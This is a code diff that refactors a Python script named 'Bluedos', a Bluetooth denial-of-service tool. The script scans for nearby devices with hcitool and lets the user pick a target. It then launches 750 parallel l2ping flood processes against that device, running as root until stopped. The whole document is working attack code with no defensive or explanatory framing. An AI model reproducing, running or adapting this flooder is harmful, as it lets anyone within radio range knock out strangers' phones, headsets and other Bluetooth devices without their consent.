@@ -1,66 +1,69 @@
 # coding=utf-8
-"""Bluedos by @ceigh"""
-from os import getuid, kill
-from subprocess import check_output, Popen, DEVNULL
+"""Bluedos by @ceigh
+gitlab.com/ceigh/bluedos/wikis"""
+import os
+import subprocess as sp
 from time import sleep
+
+
+def bye():
+    print("\nBye!")
+    sleep(1)
+    print('\033c')  # Clear terminal
+    exit(0)
 
 
 def confirm(question: str) -> bool:
     try:
         while True:
             reply = input(f"{question}: ").lower()[:1]
-            if reply in 'yosjtdд':  # (international), using {in} to consider enter too
+            if reply in 'yjsd':  # international; hit <Enter> also here
                 return True
             elif reply == 'n':
                 return False
-    except (KeyboardInterrupt, EOFError):
+    except (KeyboardInterrupt, EOFError):  # <Ctrl+C>; <Ctrl+D>
         bye()
 
 
-def bye():
-    print("\nBye!")
-    sleep(1)
-    print('\033c')
-    exit(0)
-
-
 def get_devices() -> list:
-    if not len(check_output(['hcitool', 'dev'])[9:]):
+    if not len(sp.check_output(['hcitool', 'dev'])[9:]):
         exit("Enable Bluetooth first")
     print("\033cScanning...\n")
-    hcitool_out = check_output(['hcitool', 'scan']).decode()[13:-1]
-    devices = [
-        i.split('\t')[1:]
-        for i in hcitool_out.split('\n')
-        if len(hcitool_out) != 0
-    ]
+    hcitool_out = sp.check_output(['hcitool', 'scan'])[13:-1]
+    devices = [tuple(i.split('\t')[1:])
+               for i in hcitool_out.decode().split('\n')
+               if len(hcitool_out) != 0]
     return devices
+    # [('00:00:00:00:00:00', 'Dev1'), ('11:11:11:11:11:11', 'Dev2')]
 
 
 def attack(target: list):
-    from signal import SIGTERM
     print(f"\033c\nTrying on '{target[1]}', please wait...")
-    pids = [Popen(['l2ping', '-f', '-s', '660', target[0]], stdout=DEVNULL).pid for pid in range(750)]
+    pids = [sp.Popen(['l2ping', '-f', '-s', '660', target[0]],
+                     stdout=sp.DEVNULL).pid
+            for p in range(750)]
     try:
         input(f"\033c\nAttacking '{target[1]}', press enter to stop... ")
     finally:
-        [kill(pid, SIGTERM) for pid in pids]
+        from signal import SIGTERM
+        [os.kill(pid, SIGTERM) for pid in pids]
         bye()
 
 
 def main():
     devices = get_devices()
-    dev_number = len(devices)
-    if not dev_number:
+    if not devices:
         if not confirm("No devices around :(\nScan again?"):
-            bye()
+            bye()  # Exit
         main()
-    elif dev_number == 1:
-        attack(devices[0])
+    dev_number = len(devices)
+    if dev_number == 1:
+        target_i = 0
     else:
-        print("\033c\nSeveral devices found:\n")
-        for index, device in enumerate(devices):
-            print(f"{index}) '{device[1]}'\t<{device[0]}>")
+        print(f"\033c\n{dev_number} devices found:\n")
+        [print(f"{index}) '{device[1]}'\t<{device[0]}>")
+         for index, device
+         in enumerate(devices)]
         while True:
             try:
                 target_i = int(input(f"\nSelect a device (0-{dev_number - 1}): "))
@@ -70,11 +73,10 @@ def main():
                 continue
             except (KeyboardInterrupt, EOFError):
                 bye()
-        attack(devices[target_i])
+    attack(devices[target_i])
 
 
 if __name__ == '__main__':
-    if not getuid():  # check for root launch
-        main()
-    else:
+    if os.getuid():  # Root launch check
         exit("Run it as root")
+    main()
